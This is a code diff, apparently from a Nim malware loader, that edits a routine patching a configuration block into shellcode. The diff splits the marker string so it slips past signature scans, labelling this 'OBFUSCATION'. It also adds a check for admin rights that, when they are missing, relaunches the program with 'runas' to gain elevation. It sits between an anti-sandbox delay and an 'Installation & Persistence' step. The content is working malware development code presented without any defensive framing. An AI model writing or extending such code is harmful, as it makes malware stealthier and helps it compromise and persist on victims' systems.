@@ -99,7 +99,10 @@ proc toString(arr: openArray[char]): string =
 
 proc patchPayloadConfig(payload: var openArray[byte]) =
   # Search for FRMD26_CONFIG pattern in the shellcode
-  let flag = "FRMD26_CONFIG"
+  # OBFUSCATION: Split the string so this logic itself doesn't become a search target
+  let part1 = "FRMD26_"
+  let part2 = "CONFIG"
+  let flag = part1 & part2
   let flagBytes = cast[seq[byte]](flag)
   
   var foundIndex = -1
@@ -435,6 +438,24 @@ when isMainModule:
   
   # 2. Anti-Sandbox
   Sleep(2000)
+
+  # Check if runasAdmin is required and we are not admin
+  if g_config.runasAdmin == 1.char:
+    # Check current privileges (simplified check by attempting to open SCM)
+    let scm = OpenSCManagerA(nil, nil, SC_MANAGER_CREATE_SERVICE)
+    if scm == 0:
+       # Not admin, try to elevate
+       var szPath: array[MAX_PATH, char]
+       GetModuleFileNameA(0, addr szPath[0], MAX_PATH)
+       let currentPath = toString(szPath)
+       
+       # Execute with runas
+       let ret = ShellExecuteA(0, "runas", currentPath.cstring, nil, nil, SW_SHOW)
+       if cast[int](ret) > 32:
+         # Successfully started new elevated process
+         ExitProcess(0)
+    else:
+       CloseServiceHandle(scm)
 
   # 3. Installation & Persistence
   installSelf()
